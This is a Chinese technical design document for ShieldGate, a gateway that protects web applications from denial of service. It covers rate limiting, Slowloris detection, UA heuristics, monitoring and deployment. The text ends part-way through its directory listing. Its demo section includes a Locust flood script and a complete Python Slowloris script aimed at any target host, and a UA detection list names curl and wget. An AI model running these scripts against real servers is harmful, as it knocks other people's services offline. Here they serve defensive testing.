# ShieldGate 技术设计文档

> 轻量级 Web 应用层抗拒绝服务网关 

---

## 目录

1. [项目概述](#1-项目概述)
2. [系统架构](#2-系统架构)
3. [核心模块详细设计](#3-核心模块详细设计)
4. [User-Agent 辅助识别](#4-user-agent-辅助识别)
5. [实时监控系统](#5-实时监控系统)
6. [管理后台 API](#6-管理后台-api)
7. [部署架构](#7-部署架构)
8. [演示与攻击模拟](#8-演示与攻击模拟)
9. [项目目录结构](#9-项目目录结构)
10. [安全性与局限性分析](#10-安全性与局限性分析)

---

## 1. 项目概述

### 1.1 背景

传统 DoS 防护方案存在两个极端：Cloudflare / 阿里云 DDoS 高防成本高昂且数据经过第三方；Nginx 内置限流模块配置复杂、无可视化界面，不适合非专业运维人员。ShieldGate 填补这个中间地带，面向中小企业和高校场景，以极低接入成本提供透明、可视化的 HTTP 层防护。

### 1.2 核心价值

| 特性 | 说明 |
|------|------|
| 零侵入接入 | 无需修改任何业务代码，作为反向代理透明部署 |
| 多维度防护 | 覆盖 HTTP Flood、Slowloris、并发连接耗尽、CC 攻击 |
| 规则透明可解释 | 纯规则引擎，无黑盒模型，所有封禁决策可追溯 |
| 实时可视化 | WebSocket 驱动实时监控大屏，攻击态势一目了然 |
| 轻量易部署 | Node.js + Redis，单机即可运行 |

### 1.3 防护范围

| 攻击类型 | 攻击原理 | 防护策略 |
|---------|---------|---------|
| HTTP Flood | 短时间大量请求耗尽服务器资源 | 滑动窗口限流 + IP 动态封禁 |
| Slowloris | 保持大量半开连接占用连接池 | 请求头接收超时检测 |
| CC 攻击 | 高频请求同一资源绕过 CDN 缓存 | URL 维度频率统计 |
| 并发连接耗尽 | 大量连接占而不发请求 | 单 IP 并发连接数上限 |
| 工具类攻击 | requests/curl 等脚本直接发包 | UA 特征辅助加权 |

---

## 2. 系统架构

### 2.1 整体架构

```
  ┌─────────────┐
  │   攻击者/用户  │
  └──────┬──────┘
         │ HTTP
         ▼
  ┌─────────────────────────────┐
  │      ShieldGate 网关         │  :8080
  │                             │
  │  ┌─────────────────────┐   │
  │  │     拦截器链         │   │
  │  │  0. 白名单放行       │   │
  │  │  1. 黑名单检查       │   │
  │  │  2. UA 辅助识别      │   │
  │  │  3. GeoIP 标记/阻断  │   │
  │  │  4. 并发连接限制     │   │
  │  │  5. Slowloris 检测   │   │
  │  │  6. 请求体大小限制   │   │
  │  │  7. 滑动窗口限流     │   │
  │  │  8. 人机校验挑战页   │   │
  │  └────────┬────────────┘   │
  │           │ 合法请求         │
  │  ┌────────▼───────────┐    │
  │  │  HTTP 反向代理转发  │    │
  │  └────────────────────┘    │
  └─────────────┬───────────────┘
                │
         ┌──────▼──────┐
         │  真实后端服务  │  :3000
         └─────────────┘

  ┌─────────────────────────────┐
  │  管理后台 API + WebSocket    │  :8081
  └─────────────────────────────┘

  ┌──────────┐   ┌──────────────┐
  │  Redis   │   │  Vue3 前端   │  :80 (Nginx)
  │  限流状态  │   │  监控大屏    │
  └──────────┘   └──────────────┘
```

### 2.2 拦截器链设计

拦截器链按检查代价从低到高排列，任一中间件拦截后立即短路，不执行后续步骤：

| 顺序 | 中间件 | 数据来源 | 代价 | 说明 |
|------|--------|---------|------|------|
| 0 | `whitelistCheck` | Redis SET + CIDR | 极低 | 命中白名单则标记放行，跳过后续封禁 |
| 1 | `blacklistCheck` | Redis GET O(1) | 极低 | 最快，封禁 IP 直接拒绝 |
| 2 | `uaCheck` | 本地字符串匹配 | 极低 | 标记可疑请求，调整后续阈值 |
| 3 | `geoTag` | geoip-lite 本地查表 | 极低 | 标记国家/地区；命中 GEO_BLOCK 直接 403 |
| 4 | `connectionLimit` | 内存 Map | 极低 | 同步操作，无 IO |
| 5 | `slowlorisDetect` | 定时器 | 低 | 异步，不阻塞正常请求 |
| 6 | `bodySizeLimit` | Content-Length + 流式累计 | 低 | 静态 + 动态双重拦截，超限封禁 |
| 7 | `rateLimiter` | Redis Pipeline | 低 | IP 维度 + URL（CC）维度双窗口 |
| 8 | `challengePage` | HMAC Cookie | 低 | 仅在 `req.shouldChallenge=true` 时拦下 |
| 9 | `proxyForward` | http-proxy | 正常 | 通过所有检查才转发 |

### 2.3 技术栈

| 层次 | 技术 | 版本 | 用途 |
|------|------|------|------|
| 网关核心 | Node.js + Express | 20.x | 事件驱动非阻塞 IO |
| 反向代理 | http-proxy-middleware | 3.x | 透明转发 HTTP 请求 |
| 限流存储 | Redis + ioredis | 7.x | 分布式限流状态 |
| 实时推送 | ws | 8.x | WebSocket 服务端 |
| 管理 API | Express REST | — | 规则配置、封禁管理 |
| 前端 | Vue3 + Ant Design Vue | 4.x | 监控大屏、配置页 |
| 图表 | Chart.js | 4.x | 实时折线图 |
| 静态托管 | Nginx | 1.24 | 前端文件 + 反代 API |
| 进程管理 | PM2 | 5.x | 守护进程、日志 |

---

## 3. 核心模块详细设计

### 3.1 IP 获取工具函数

所有中间件依赖统一的 IP 获取逻辑，优先读取 `X-Forwarded-For`（经过 Nginx 反代时的真实客户端 IP）：

```javascript
// utils/getIP.js
function getIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    // X-Forwarded-For 可能是逗号分隔的链，取第一个（最原始客户端）
    return forwarded.split(',')[0].trim();
  }
  return req.socket.remoteAddress;
}

module.exports = getIP;
```

> **安全注意**：若网关直接暴露在公网（未经 Nginx），攻击者可以伪造 `X-Forwarded-For` 头绕过限流。生产环境应在 Nginx 层强制覆盖该头：
> ```nginx
> proxy_set_header X-Forwarded-For $remote_addr;  # 用真实 IP 覆盖，不信任客户端传入的值
> ```

---

### 3.2 黑名单检查（blacklistCheck）

```javascript
// middleware/blacklistCheck.js
const redis = require('../utils/redis');
const getIP = require('../utils/getIP');
const stats = require('../utils/stats');

async function blacklistCheck(req, res, next) {
  const ip = getIP(req);
  const reason = await redis.get(`ban:${ip}`);

  if (reason) {
    stats.blocked++;
    stats.emit('blocked', { ip, reason, time: Date.now() });
    return res.status(403).json({
      error: 'Forbidden',
      reason,
      retryAfter: await redis.ttl(`ban:${ip}`)
    });
  }

  next();
}

module.exports = blacklistCheck;
```

**Redis 数据结构：**

```
ban:{ip}        → String，value=封禁原因，TTL=封禁剩余秒数
ban:history     → List，最近100条封禁记录（JSON字符串）
```

---

### 3.3 User-Agent 辅助识别（uaCheck）

UA 识别不做独立封禁决策，仅在请求上标记 `isSuspiciousUA = true`，后续限流中间件会据此降低阈值（更敏感）。

```javascript
// middleware/uaCheck.js

// 已知攻击/测试工具的 UA 特征（大小写不敏感匹配）
const SUSPICIOUS_PATTERNS = [
  '',                    // 空 UA（大量攻击脚本不设 UA）
  'python-requests',     // Python requests 库默认 UA
  'python-urllib',       // Python urllib
  'go-http-client',      // Go net/http 默认 UA
  'curl/',               // curl 命令行
  'wget/',               // wget 命令行
  'locust',              // Locust 压测工具
  'apache-httpclient',   // Java Apache HttpClient
  'okhttp',              // Android/Java OkHttp（脚本常用）
  'httpie',              // HTTPie 工具
  'scrapy',              // Python 爬虫框架
  'java/',               // Java 原生 HTTP（未设自定义 UA）
];

// 正常浏览器 UA 必然包含的关键词（正向白名单辅助）
const BROWSER_SIGNALS = ['mozilla', 'webkit', 'gecko', 'chrome', 'safari'];

function uaCheck(req, res, next) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();

  // 空 UA 直接标记
  if (!ua) {
    req.isSuspiciousUA = true;
    req.uaReason = 'empty_ua';
    return next();
  }

  // 命中黑名单特征
  const matched = SUSPICIOUS_PATTERNS.find(p => p && ua.includes(p.toLowerCase()));
  if (matched) {
    req.isSuspiciousUA = true;
    req.uaReason = `matched:${matched}`;
    return next();
  }

  // 不含任何浏览器信号（但未命中黑名单，属于未知 UA）
  const hasBrowserSignal = BROWSER_SIGNALS.some(s => ua.includes(s));
  if (!hasBrowserSignal) {
    req.isSuspiciousUA = true;
    req.uaReason = 'no_browser_signal';
  }

  next();
}

module.exports = uaCheck;
```

**为什么不直接封禁可疑 UA？**

UA 头可以被攻击者一行代码伪造成任意值（包括 Chrome 的真实 UA）。直接基于 UA 封禁会带来两个问题：
- 攻击者绕过成本极低
- 误封使用非主流 HTTP 客户端的合法用户（如 API 调用方）

UA 检测的价值在于：对那些连 UA 都懒得伪造的低成本攻击脚本，能提前提高警戒级别。

---

### 3.4 并发连接限制（connectionLimit）

```javascript
// middleware/connectionLimit.js
const getIP = require('../utils/getIP');
const config = require('../config');

// 用内存 Map 而非 Redis：
// 1. 并发连接是单机本地状态
// 2. Map 操作同步，避免高并发下 Redis 异步竞争
const connections = new Map();

function connectionLimit(req, res, next) {
  const ip = getIP(req);

  // 可疑 UA 的连接上限减半
  const limit = req.isSuspiciousUA
    ? Math.floor(config.MAX_CONNECTIONS / 2)
    : config.MAX_CONNECTIONS;

  const count = connections.get(ip) || 0;

  if (count >= limit) {
    return res.status(429).json({ error: 'Too many connections' });
  }

  connections.set(ip, count + 1);

  // 请求结束时释放计数（finish=正常结束，close=连接中断）
  const release = () => {
    const current = connections.get(ip);
    if (current === undefined) return;
    if (current <= 1) connections.delete(ip);
    else connections.set(ip, current - 1);
  };

  res.on('finish', release);
  res.on('close', release);

  next();
}

module.exports = connectionLimit;
```

---

### 3.5 Slowloris 检测（slowlorisDetect）

Slowloris 攻击特征：建立 TCP 连接后，故意以极慢速度发送 HTTP 请求头（每隔几秒发几个字节），使服务器一直等待完整请求头，从而占用连接不释放。

```javascript
// middleware/slowlorisDetect.js
const getIP = require('../utils/getIP');
const { banIP } = require('../utils/banIP');
const config = require('../config');
const stats = require('../utils/stats');

function slowlorisDetect(req, res, next) {
  const ip = getIP(req);

  // 启动超时计时器，超时说明请求头迟迟未发完
  const timer = setTimeout(async () => {
    await banIP(ip, 'Slowloris', config.BAN_TTL_SLOWLORIS);
    stats.blocked++;
    stats.emit('attack', { ip, type: 'Slowloris', time: Date.now() });

    // 强制断开该连接
    try { req.destroy(); } catch (_) {}
  }, config.SLOWLORIS_TIMEOUT_MS);

  // 以下三个事件任意一个触发，说明请求头已接收完毕或连接已关闭，清除计时器
  req.on('end', () => clearTimeout(timer));
  req.on('close', () => clearTimeout(timer));
  req.on('error', () => clearTimeout(timer));

  // 注意：next() 必须在设置计时器后立即调用
  // 计时器在后台异步运行，不阻塞正常请求的继续处理
  next();
}

module.exports = slowlorisDetect;
```

**`config.SLOWLORIS_TIMEOUT_MS` 取值建议：**

| 场景 | 推荐值 | 说明 |
|------|-------|------|
| 演示/测试 | 5000ms | 封禁触发快，效果直观 |
| 生产环境 | 10000ms | 给弱网用户足够时间 |
| 误封敏感场景 | 15000ms | 最保守，降低误封率 |

---

### 3.6 滑动窗口限流（rateLimiter）

选用滑动窗口（基于 Redis ZSET）而非令牌桶：

- **令牌桶**：允许一定突发流量（桶满时可短暂超过限速），适合 API 限速
- **滑动窗口**：严格按时间窗口内请求数限制，无突发余量，更适合 DoS 防护

```javascript
// middleware/rateLimiter.js
const redis = require('../utils/redis');
const getIP = require('../utils/getIP');
const { banIP } = require('../utils/banIP');
const config = require('../config');
const stats = require('../utils/stats');

async function rateLimiter(req, res, next) {
  const ip = getIP(req);
  const now = Date.now();
  const key = `rate:${ip}`;

  // 可疑 UA 的限流阈值降低为正常值的 60%
  const limit = req.isSuspiciousUA
    ? Math.floor(config.RATE_LIMIT * 0.6)
    : config.RATE_LIMIT;

  // 使用 Pipeline 将 4 个命令合并为一次网络往返，降低延迟
  const pipeline = redis.pipeline();
  // 1. 清除窗口外的过期记录
  pipeline.zremrangebyscore(key, 0, now - config.RATE_WINDOW_MS);
  // 2. 将本次请求记录加入 ZSET（score=时间戳，member=时间戳+随机数防重复）
  pipeline.zadd(key, now, `${now}:${Math.random().toString(36).slice(2)}`);
  // 3. 统计当前窗口内的请求数
  pipeline.zcard(key);
  // 4. 设置 key 过期时间（窗口结束后自动清理）
  pipeline.expire(key, Math.ceil(config.RATE_WINDOW_MS / 1000) + 1);

  const results = await pipeline.exec();
  const count = results[2][1];  // zcard 的结果

  if (count > limit) {
    await banIP(ip, 'HTTP Flood', config.BAN_TTL_FLOOD);
    stats.blocked++;
    stats.emit('attack', {
      ip,
      type: req.isSuspiciousUA ? 'HTTP Flood (suspicious UA)' : 'HTTP Flood',
      time: Date.now()
    });
    return res.status(429).json({
      error: 'Rate limit exceeded',
      retryAfter: config.BAN_TTL_FLOOD
    });
  }

  next();
}

module.exports = rateLimiter;
```

---

### 3.7 封禁管理（banIP）

```javascript
// utils/banIP.js
const redis = require('./redis');
const stats = require('./stats');

/**
 * 封禁一个 IP
 * @param {string} ip       目标 IP
 * @param {string} reason   封禁原因（'HTTP Flood' | 'Slowloris' | 手动）
 * @param {number} ttl      封禁时长（秒），默认 300
 */
async function banIP(ip, reason, ttl = 300) {
  const pipeline = redis.pipeline();

  // 封禁状态（TTL 到期自动解封）
  pipeline.setex(`ban:${ip}`, ttl, reason);

  // 写入封禁历史（用于前端展示，保留最近 100 条）
  pipeline.lpush('ban:history', JSON.stringify({
    ip,
    reason,
    ttl,
    time: Date.now(),
    expireAt: Date.now() + ttl * 1000,
  }));
  pipeline.ltrim('ban:history', 0, 99);

  await pipeline.exec();
  stats.banned++;
}

/**
 * 手动解封
 */
async function unbanIP(ip) {
  await redis.del(`ban:${ip}`);
}

module.exports = { banIP, unbanIP };
```

---

### 3.8 IP/CIDR 白名单（whitelistCheck）

白名单中间件位于链路最前端，命中即给请求打上 `req.isWhitelisted=true`，后续 `bodySizeLimit`、`rateLimiter`、`challengePage` 等都会直接放行。条目支持单 IP 与 CIDR（如 `10.0.0.0/8`），通过管理后台 `/api/whitelist` 持久化在 Redis 中：

```javascript
// gateway/middleware/whitelistCheck.js
const whitelist = require('../utils/whitelist');

async function whitelistCheck(req, _res, next) {
  const ip = getIP(req);
  const matched = await whitelist.isWhitelisted(ip);
  if (matched) {
    req.isWhitelisted = true;
    req.whitelistRule = matched;   // 命中的规则字符串，便于审计
  }
  next();
}
```

CIDR 匹配通过 `utils/cidr.js` 工具实现（IPv4/IPv6 双栈），匹配过程在内存中完成，单次成本是常数级。

---

### 3.9 GeoIP 标记与硬阻断（geoTag）

基于 `geoip-lite` 本地数据库（无外网请求）。每个请求被打上 `req.geo = { country, region, timezone }`，并按配置区分两类策略：

| 配置项 | 行为 |
|--------|------|
| `GEO_BLOCK = ['KP', 'RU']` | 命中即 403 + 自动封禁 |
| `GEO_WATCH = ['CN-HK']` | 仅打 `req.isGeoWatched`，限流阈值收紧 |

`geoip-lite` 是可选依赖：缺失时模块自动降级为 no-op，不会影响主链路启动。

---

### 3.10 请求体大小限制（bodySizeLimit）

针对"小连接打大包体"耗尽服务器内存/带宽的场景。两道防线：

1. **静态拦截**：直接读 `Content-Length`，超过 `MAX_BODY_BYTES` 立刻 413 拒绝；
2. **流式拦截**：监听 `data` 事件累计真实接收字节，超限即调 `req.destroy()` 断开 + `banIP()` 封禁，防止攻击者声明小 Content-Length 实际发大包绕过。

白名单 IP 自动跳过该检测。

---

### 3.11 人机校验挑战页（challengePage）

仅在前置规则给请求打了 `req.shouldChallenge=true` 时才会拦下（典型场景：可疑 UA + 频率接近上限）。返回一段极简 HTML：

- 浏览器执行内联 JS，写入一个由服务端 HMAC 签发的 `sg_chal` Cookie，然后自动 `location.reload()` —— 真实浏览器无感知地通过；
- 不执行 JS 的攻击脚本无法获得 Cookie，只能反复看到挑战页，被后续限流封禁。

HMAC 的密钥来自 `config.CHALLENGE_SECRET`，按"分钟级时间戳 + IP"派生 token，10 分钟内有效。这是极轻量的 JS 检测，对抗 headless 浏览器需更换为 PoW 或 hCaptcha。

---

### 3.12 后台鉴权（admin/auth）

所有写入类 API 都通过 `requireAuth` 中间件守护，登录态以 HttpOnly + SameSite=Lax 的 JWT Cookie 形式下发：

| 模块 | 作用 |
|------|------|
| `auth/jwt.js` | HS256 签发/校验，默认 24h 过期 |
| `auth/users.js` | bcrypt 哈希存储；首次启动自动写入默认管理员，上线后强制改密 |
| `auth/loginGuard.js` | 用户名维度 + IP 维度双计数器；连续失败触发临时锁定 |
| `auth/validate.js` | 拒绝典型 SQLi 字符与超长输入 |
| `auth/ssrfGuard.js` | 后台外联（如威胁情报）的目标域名白名单 |

> 设计权衡：JWT 选择 Cookie 而非 `Authorization: Bearer`，是为了让前端 JS 拿不到 token，避免 XSS 直接窃取；CSRF 由 SameSite=Lax 阻断。

---

### 3.13 配置文件

所有阈值集中在 `config.js`，支持通过管理后台动态修改（写回 Redis，网关定期读取）：

```javascript
// config.js
module.exports = {
  // 目标后端地址
  BACKEND_URL: process.env.BACKEND_URL || 'http://localhost:3000',

  // 滑动窗口限流
  RATE_LIMIT: 50,           // 窗口内最大请求数
  RATE_WINDOW_MS: 1000,     // 窗口大小（毫秒）

  // 并发连接限制
  MAX_CONNECTIONS: 20,      // 单 IP 最大并发连接数

  // Slowloris 检测
  SLOWLORIS_TIMEOUT_MS: 10000,  // 请求头接收超时（毫秒）

  // 封禁时长
  BAN_TTL_FLOOD: 300,       // HTTP Flood 封禁时长（秒）
  BAN_TTL_SLOWLORIS: 300,   // Slowloris 封禁时长（秒）
  BAN_TTL_MANUAL: 3600,     // 手动封禁默认时长（秒）

  // Redis
  REDIS_URL: process.env.REDIS_URL || 'redis://127.0.0.1:6379',
};
```

---

## 4. User-Agent 辅助识别

### 4.1 设计原则

UA 识别遵循以下原则，不做独立封禁：

```
可疑 UA + 正常频率  →  仅记录日志，不封禁
可疑 UA + 超频      →  限流阈值降低 40%，更容易触发封禁
可疑 UA + 超连接数  →  连接上限降低 50%
```

### 4.2 检测逻辑流程

```
接收请求
    │
    ▼
UA 是否为空？ ──是──► 标记 isSuspiciousUA=true，reason=empty_ua
    │否
    ▼
命中黑名单特征？ ──是──► 标记 isSuspiciousUA=true，reason=matched:{pattern}
    │否
    ▼
包含浏览器信号？ ──否──► 标记 isSuspiciousUA=true，reason=no_browser_signal
    │是
    ▼
isSuspiciousUA=false（正常请求）
    │
    ▼
继续后续中间件（使用正常阈值）
```

### 4.3 阈值对比

| 检测指标 | 正常请求 | 可疑 UA 请求 |
|---------|---------|------------|
| 限流阈值（次/秒） | 50 | 30（降低 40%） |
| 最大并发连接数 | 20 | 10（降低 50%） |
| Slowloris 超时 | 10000ms | 10000ms（不变） |

### 4.4 维护建议

UA 黑名单是一个字符串数组，随着新工具出现需要持续补充。建议：
- 定期分析封禁日志中的 UA 分布，发现新的攻击工具特征
- 不要把太泛的关键词加入黑名单（如 `"Java"` 会误封大量合法 Java 客户端）

---

## 5. 实时监控系统

### 5.1 统计数据结构

```javascript
// utils/stats.js
const EventEmitter = require('events');

class Stats extends EventEmitter {
  constructor() {
    super();
    this.total = 0;          // 累计请求总数
    this.blocked = 0;        // 累计拦截次数
    this.banned = 0;         // 累计封禁 IP 数
    this.currentRPS = 0;     // 当前每秒请求数
    this.history = [];       // 最近 60 秒每秒请求量
    this._windowCount = 0;   // 当前秒内计数器
  }

  record() {
    this.total++;
    this._windowCount++;
  }

  tick() {
    // 每秒调用一次，更新历史
    this.currentRPS = this._windowCount;
    this.history.push(this._windowCount);
    if (this.history.length > 60) this.history.shift();
    this._windowCount = 0;
  }

  snapshot() {
    return {
      total: this.total,
      blocked: this.blocked,
      banned: this.banned,
      currentRPS: this.currentRPS,
      history: [...this.history],
    };
  }
}

module.exports = new Stats();
```

### 5.2 WebSocket 推送

```javascript
// admin/websocket.js
const WebSocket = require('ws');
const redis = require('../utils/redis');
const stats = require('../utils/stats');

function setupWebSocket(server) {
  const wss = new WebSocket.Server({ server, path: '/ws' });

  // 每秒广播统计数据 + 最新封禁记录
  setInterval(async () => {
    stats.tick();

    const banHistory = await redis.lrange('ban:history', 0, 9);
    const recentBans = banHistory.map(item => {
      try { return JSON.parse(item); } catch { return null; }
    }).filter(Boolean);

    const payload = JSON.stringify({
      type: 'stats',
      data: {
        ...stats.snapshot(),
        recentBans,
      }
    });

    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(payload);
      }
    });
  }, 1000);

  // 攻击事件实时推送（不等待下一次 tick）
  stats.on('attack', (event) => {
    const payload = JSON.stringify({ type: 'attack', data: event });
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) client.send(payload);
    });
  });

  return wss;
}

module.exports = setupWebSocket;
```

### 5.3 前端接收与图表更新

```javascript
// frontend/src/composables/useWebSocket.js
import { ref, onUnmounted } from 'vue';

export function useWebSocket(url) {
  const stats = ref(null);
  const recentBans = ref([]);
  const attacks = ref([]);
  let ws = null;

  function connect() {
    ws = new WebSocket(url);

    ws.onmessage = (event) => {
      const { type, data } = JSON.parse(event.data);

      if (type === 'stats') {
        stats.value = data;
        recentBans.value = data.recentBans;
      }

      if (type === 'attack') {
        attacks.value.unshift(data);
        if (attacks.value.length > 50) attacks.value.pop();
      }
    };

    // 断线自动重连
    ws.onclose = () => setTimeout(connect, 3000);
  }

  connect();
  onUnmounted(() => ws?.close());

  return { stats, recentBans, attacks };
}
```

```javascript
// Chart.js 折线图更新（无动画保证流畅）
watch(() => stats.value?.history, (history) => {
  if (!history) return;
  chart.data.labels = history.map((_, i) => `${i - 59}s`);
  chart.data.datasets[0].data = history;
  chart.update('none');  // 'none' 跳过动画
});
```

---

## 6. 管理后台 API

### 6.1 接口列表

除 `/api/auth/login` 与 `/api/auth/me` 外，所有接口都需通过 `requireAuth` 中间件校验 JWT（HttpOnly Cookie 形式下发）。

| 模块 | 方法 | 路径 | 说明 |
|------|------|------|------|
| 认证 | `POST` | `/api/auth/login` | 用户名/密码登录，下发 HttpOnly JWT Cookie |
| 认证 | `POST` | `/api/auth/logout` | 清除登录态 |
| 认证 | `GET`  | `/api/auth/me` | 获取当前登录用户信息 |
| 认证 | `POST` | `/api/auth/change-password` | 修改密码 |
| 认证 | `GET`  | `/api/auth/users` | 列出已注册用户（管理员） |
| 统计 | `GET`  | `/api/stats` | 获取当前统计快照 |
| 封禁 | `GET`  | `/api/bans` | 获取封禁 IP 列表（含剩余 TTL） |
| 封禁 | `POST` | `/api/bans` | 手动封禁指定 IP |
| 封禁 | `DELETE` | `/api/bans/:ip` | 手动解封指定 IP |
| 配置 | `GET`  | `/api/config` | 获取当前规则配置 |
| 配置 | `PUT`  | `/api/config` | 更新规则配置（热更新，10s 内生效） |
| 规则 | `GET`  | `/api/rules/hits` | 获取每条规则的命中计数 |
| 规则 | `POST` | `/api/rules/hits/reset` | 清零规则命中计数 |
| 白名单 | `GET`  | `/api/whitelist` | 列出 IP/CIDR 白名单 |
| 白名单 | `POST` | `/api/whitelist` | 新增白名单条目（IP 或 CIDR） |
| 白名单 | `DELETE` | `/api/whitelist/:spec` | 删除白名单条目 |
| 威胁情报 | `GET` | `/api/threat-intel/cves` | 获取最新 CVE 列表（CIRCL 缓存 5min） |
| 威胁情报 | `GET` | `/api/threat-intel/iocs` | 获取 IOC 情报源 |
| 威胁情报 | `GET` | `/api/threat-intel/summary` | 综合摘要（前端首屏） |

### 6.2 关键接口实现

```javascript
// admin/routes/bans.js
const router = require('express').Router();
const redis = require('../../utils/redis');
const { banIP, unbanIP } = require('../../utils/banIP');

// 获取封禁列表（含剩余 TTL）
router.get('/', async (req, res) => {
  const history = await redis.lrange('ban:history', 0, 49);
  const bans = await Promise.all(
    history.map(async (item) => {
      const { ip, reason, time } = JSON.parse(item);
      const ttl = await redis.ttl(`ban:${ip}`);
      return { ip, reason, time, ttl, active: ttl > 0 };
    })
  );
  res.json(bans);
});

// 手动解封
router.delete('/:ip', async (req, res) => {
  await unbanIP(req.params.ip);
  res.json({ success: true });
});

// 手动封禁
router.post('/', async (req, res) => {
  const { ip, reason = '手动封禁', ttl = 3600 } = req.body;
  await banIP(ip, reason, ttl);
  res.json({ success: true });
});

module.exports = router;
```

```javascript
// admin/routes/config.js - 规则热更新
router.put('/', async (req, res) => {
  const { rateLimit, maxConnections, slowlorisTimeout, banTtl } = req.body;

  // 写入 Redis，网关进程定期（每10秒）读取并更新内存配置
  if (rateLimit)          await redis.set('config:rateLimit', rateLimit);
  if (maxConnections)     await redis.set('config:maxConnections', maxConnections);
  if (slowlorisTimeout)   await redis.set('config:slowlorisTimeout', slowlorisTimeout);
  if (banTtl)             await redis.set('config:banTtl', banTtl);

  res.json({ success: true, message: '配置已更新，10秒内生效' });
});
```

---

## 7. 部署架构

### 7.1 单机部署方案

```
服务器（mg2）
├── :80    Nginx
│          ├── /          → 前端静态文件 (dist/)
│          ├── /api/      → 管理后台 API :8081
│          └── /ws        → WebSocket :8081
├── :8080  ShieldGate 网关（PM2 守护）
├── :8081  管理后台 API + WebSocket（PM2 守护）
├── :6379  Redis（仅监听 127.0.0.1）
└── :3000  模拟后端 / 真实业务
```

演示时攻击脚本打 `:8080`（网关），管理大屏通过 `:80` 访问，两条流量完全隔离。

### 7.2 Nginx 配置

```nginx
server {
    listen 80;
    server_name your-domain.com;

    # 前端静态文件（Vue3 build 产物）
    location / {
        root /var/www/shieldgate;
        try_files $uri $uri/ /index.html;
        gzip on;
        gzip_types text/javascript application/javascript text/css;
    }

    # 管理 API 反代
    location /api/ {
        proxy_pass http://127.0.0.1:8081;
        proxy_set_header Host $host;
        # 强制覆盖 X-Forwarded-For，防止客户端伪造
        proxy_set_header X-Forwarded-For $remote_addr;
    }

    # WebSocket 反代（需要 Upgrade 支持）
    location /ws {
        proxy_pass http://127.0.0.1:8081;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400;  # WebSocket 长连接不超时
    }
}
```

### 7.3 PM2 配置

```javascript
// ecosystem.config.js
module.exports = {
  apps: [
    {
      name: 'shieldgate-gateway',
      script: 'gateway/index.js',
      instances: 1,
      autorestart: true,
      watch: false,
      env: {
        NODE_ENV: 'production',
        PORT: 8080,
        REDIS_URL: 'redis://127.0.0.1:6379',
        BACKEND_URL: 'http://127.0.0.1:3000',
      }
    },
    {
      name: 'shieldgate-admin',
      script: 'admin/index.js',
      instances: 1,
      autorestart: true,
      env: {
        NODE_ENV: 'production',
        PORT: 8081,
        REDIS_URL: 'redis://127.0.0.1:6379',
      }
    }
  ]
};
```

```bash
# 部署命令
npm run build --prefix frontend   # 构建前端
cp -r frontend/dist /var/www/shieldgate

pm2 start ecosystem.config.js
pm2 save
pm2 startup  # 设置开机自启
```

---

## 8. 演示与攻击模拟

### 8.1 HTTP Flood 模拟（Locust）

```python
# scripts/flood.py
from locust import HttpUser, task, constant

class FloodUser(HttpUser):
    wait_time = constant(0)  # 无间隔连续发送

    @task
    def flood(self):
        with self.client.get('/', catch_response=True) as resp:
            if resp.status_code in (403, 429):
                resp.success()  # 被拦截也算成功，不影响统计

# 启动命令：200 并发，50/s 生成，运行 30 秒
# locust -f scripts/flood.py --host=http://your-server:8080 \
#        --users=200 --spawn-rate=50 --headless -t 30s
```

### 8.2 Slowloris 模拟

```python
# scripts/slowloris.py
import socket
import time
import sys

def slowloris(target, port, socket_count=150):
    print(f"[*] 目标: {target}:{port}，建立 {socket_count} 个慢速连接")
    sockets = []

    for i in range(socket_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            # 发送不完整的请求头（故意不以 \r\n\r\n 结束）
            s.send(
                b"GET / HTTP/1.1\r\n"
                b"Host: " + target.encode() + b"\r\n"
                b"User-Agent: Mozilla/5.0\r\n"
                b"Accept-language: en-US\r\n"
            )
            sockets.append(s)
        except socket.error:
            pass

    print(f"[+] 成功建立 {len(sockets)} 个慢速连接")

    while True:
        alive = []
        for s in sockets:
            try:
                # 每 5 秒发送一个无意义的头，维持连接不超时
                s.send(b"X-a: b\r\n")
                alive.append(s)
            except socket.error:
                pass  # 连接被服务端断开，丢弃

        sockets = alive
        print(f"[*] 活跃连接: {len(sockets)}")

        if not sockets:
            print("[!] 所有连接已被断开（防护生效）")
            break

        time.sleep(5)

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    slowloris(target, port)

# 运行：python scripts/slowloris.py your-server 8080
```

### 8.3 标准演示流程

| 步骤 | 操作 | 预期效果 |
|------|------|---------|
| 1 | 打开监控大屏，展示正常流量 | 折线图平稳，封禁列表为空 |
| 2 | 运行 Slowloris 脚本（150 连接） | 10s 后 IP 被封禁，攻击事件出现 |
| 3 | 停止 Slowloris，运行 HTTP Flood | 折线图急剧上升后 IP 封禁，图形恢复平稳 |
| 4 | 在配置页手动解封某个 IP | 封禁列表更新 |
| 5 | 降低限流阈值至 10 次/秒后再次攻击 | 演示规则热更新效果 |

---

## 9. 项目目录结构

```
shieldgate/
├── gateway/                        # 网关核心（:8080）
│   ├── index.js                   # 入口，Express + 中间件链 + 反向代理
│   ├── config.js                  # 配置（含从 Redis 热加载逻辑）
│   ├── middleware/
│   │   ├── whitelistCheck.js      # IP/CIDR 白名单放行
│   │   ├── blacklistCheck.js      # 黑名单检查
│   │   ├── uaCheck.js             # UA 辅助识别
│   │   ├── geoTag.js              # GeoIP 国别标记 / 硬阻断
│   │   ├── connectionLimit.js     # 并发连接限制
│   │   ├── slowlorisDetect.js     # Slowloris 检测
│   │   ├── bodySizeLimit.js       # 请求体大小限制（静态+流式）
│   │   ├── rateLimiter.js         # 滑动窗口限流（IP + CC 双维度）
│   │   └── challengePage.js       # 人机校验挑战页
│   └── utils/
│       ├── redis.js               # Redis 连接（ioredis 单例）
│       ├── banIP.js               # 封禁/解封操作
│       ├── getIP.js               # IP 获取工具
│       ├── stats.js               # 全局统计（EventEmitter）
│       ├── ruleStats.js           # 各规则命中计数
│       ├── whitelist.js           # 白名单存取（Redis 持久化）
│       ├── cidr.js                # CIDR 匹配工具
